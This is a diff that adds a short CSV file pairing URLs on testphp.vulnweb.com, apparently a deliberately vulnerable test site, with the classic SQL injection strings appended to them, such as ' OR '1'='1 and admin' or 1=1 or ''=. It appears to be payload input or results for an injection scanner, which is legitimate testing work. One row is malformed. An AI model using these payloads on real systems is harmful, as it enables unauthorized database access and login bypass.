@@ -1,0 +1,9 @@
+URL,Vulnerability
+http://testphp.vulnweb.com/' OR '1'='1,' OR '1'='1
+http://testphp.vulnweb.com/' OR '1'='1' --,' OR '1'='1' --
+http://testphp.vulnweb.com/' or 1=1 limit 1 -- -+,' or 1=1 limit 1 -- -+
+http://testphp.vulnweb.com/admin' or 1=1 or ''=',admin' or 1=1 or ''='
+http://testphp.vulnweb.com/'=' or ','=' or '
+http://testphp.vulnweb.com/' or '1'='1',' or '1'='1'
+http://testphp.vulnweb.com/'hi' or 'a'='a','hi' or 'a'='a'
+http://testphp.vulnweb.com/' or 'a'='a',' or 'a'='a'
